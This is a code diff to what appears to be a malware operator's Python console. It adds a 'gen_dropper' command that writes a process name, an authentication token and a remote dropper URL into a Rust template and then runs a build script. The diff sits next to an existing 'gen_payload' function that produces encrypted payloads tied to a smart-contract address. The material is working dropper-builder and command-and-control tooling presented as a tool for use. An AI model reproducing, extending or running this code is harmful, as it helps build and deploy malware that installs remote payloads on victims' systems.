@@ -4,9 +4,9 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import unpad
 from Crypto import Random
+import os
 
-# grettz to every0ne! hack the pl4net!!!!!!!!!!!!!!!!!!!!!!!!!!
-
+# Global variable that mantain client's connections
 connections = []
 
 debug = True
@@ -19,7 +19,7 @@ def write_hash_to_artifact(hash, uniqueAESKey, smartContractKey, KeccakData, sta
     if debug != True:
         fout = open(f"main-{datetime.utcnow().timestamp()}.rs", "wt")
     else:
-        fout = open(f"./migrate/src/main.rs", "wt")
+        fout = open(f"./migrate/src/lib.rs", "wt")
     #for each line in the input file
     for line in fin:
         #read replace the string and write to output file CONTRACTVARIABLENAME
@@ -48,6 +48,17 @@ def AESdecrypt(key, enc):
         iv = enc[:AES.block_size]
         cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
         return _unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+
+# processName https://dropperaddress.com dropperPassword exportName (default == iLoveCatsXD)
+# gen_dropper(command[1], command[2], command[3], command[4])
+def gen_dropper(processName, dropperAddress, dropperPassword, exportName):
+    fin = open("./templates/sylas_template.rs", "rt")
+    fout = open(f"./sylas/src/main.rs", "wt")
+    for line in fin:
+        fout.write(line.replace('PROCNAMEHERE', processName).replace('AUTHENTICATIONTOKENHERE', dropperPassword).replace('REMOTEDROPPERADDRESSHERE', dropperAddress).replace('EXPORTNAME', exportName))
+    fin.close()
+    fout.close()
+    os.system("cd sylas && bash ./build.sh")
 
 
 def gen_payload(server, contractAddress_recv, contractKey, KeccakData):
@@ -264,12 +275,17 @@ def server() -> None:
         socket_instance.close()
 
 def command():
+    print("gen_dropper processName https://dropperaddress.com dropperPassword exportName (default == iLoveCatsXD)")
     while True:
         try:
             command = input("\n> ").split()
             if(command[0] == "gen_payload"):
                 # 0x7f000001:0x53A 0xcbebf47dfEe4d9E69075A54e35a796f376e39dC8 fmPTbnQKLeEaHDqelq3kcw== c217acd5
                 gen_payload(command[1], command[2], command[3], command[4])
+            if(command[0] == "gen_dropper"):
+                # processName https://dropperaddress.com dropperPassword exportName (default == iLoveCatsXD)
+                print("Run gen_payload first if already executed")
+                gen_dropper(command[1], command[2], command[3], command[4])
             if(command[0]  == "list_payloads"):
                 list_payloads()
         except Exception as err:
